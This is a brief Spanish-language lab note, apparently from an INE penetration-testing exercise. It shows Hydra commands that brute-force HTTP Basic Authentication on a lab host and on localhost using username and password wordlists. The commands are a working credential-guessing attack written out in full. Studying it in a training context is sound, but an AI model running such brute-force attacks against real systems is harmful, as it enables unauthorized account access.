Con este comando:
`hydra -l bob -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target1.ine.local http-get "/" -m "Authorization: Basic ^USER^:^PASS^"`

El parámetro -m permite modificar los headers de la petición. En este caso como es un basic auth, las modificamos.

Comandos que funcionaron:

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P passwords.txt 127.0.0.1 http-get "/" -m "Authorization: Basic ^USER^:^PASS^" -s 8000
```

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -P passwords.txt 127.0.0.1 http-get "/" -m "Authorization: Basic ^USER^:^PASS^" -s 8000
```
